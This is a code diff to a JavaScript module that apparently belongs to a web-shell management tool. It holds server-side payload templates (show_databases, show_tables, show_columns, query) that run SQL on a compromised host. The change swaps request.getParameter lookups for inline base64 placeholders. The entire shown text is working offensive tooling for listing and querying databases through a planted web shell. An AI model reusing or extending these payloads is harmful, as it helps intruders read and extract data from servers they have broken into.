@@ -47,12 +47,10 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       return executeSQL(encode, conn, sql, columnsep, rowsep, false);
     }
     
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
+    var z1 = decode("#{newbase64::encode}");
+    var z2 = decode("#{newbase64::conn}");
     output.append(showDatabases(z1, z2));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::encode}",
-    [arg2]: "#{newbase64::conn}",
   },
   show_tables: {
     _: `
@@ -92,14 +90,11 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       return executeSQL(encode, conn, sql, columnsep, rowsep, false);
     }
     
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
-    var z3 = decode(request.getParameter("${arg3}"));
+    var z1 = decode("#{newbase64::encode}");
+    var z2 = decode("#{newbase64::conn}");
+    var z3 = decode("#{newbase64::db}");
     output.append(showTables(z1, z2, z3));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::encode}",
-    [arg2]: "#{newbase64::conn}",
-    [arg3]: "#{newbase64::db}",
   },
   show_columns: {
     _: `
@@ -139,16 +134,12 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       return executeSQL(encode, conn, sql, columnsep, rowsep, true);
     }
     
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
-    var z3 = decode(request.getParameter("${arg3}"));
-    var z4 = decode(request.getParameter("${arg4}"));
+    var z1 = decode("#{newbase64::encode}");
+    var z2 = decode("#{newbase64::conn}");
+    var z3 = decode("#{newbase64::db}");
+    var z4 = decode("#{newbase64::table}");
     output.append(showColumns(z1, z2, z3, z4));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::encode}",
-    [arg2]: "#{newbase64::conn}",
-    [arg3]: "#{newbase64::db}",
-    [arg4]: "#{newbase64::table}",
   },
   query: {
     _: `
@@ -213,13 +204,10 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       var rowsep = "\\r\\n";
       return executeSQL(encode, conn, sql, columnsep, rowsep, true);
     }
-    var z1 = decode(request.getParameter("${arg1}"));
-    var z2 = decode(request.getParameter("${arg2}"));
-    var z3 = decode(request.getParameter("${arg3}"));
+    var z1 = decode("#{newbase64::encode}");
+    var z2 = decode("#{newbase64::conn}");
+    var z3 = decode("#{newbase64::sql}");
     output.append(query(z1, z2, z3));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::encode}",
-    [arg2]: "#{newbase64::conn}",
-    [arg3]: "#{newbase64::sql}",
   },
 });
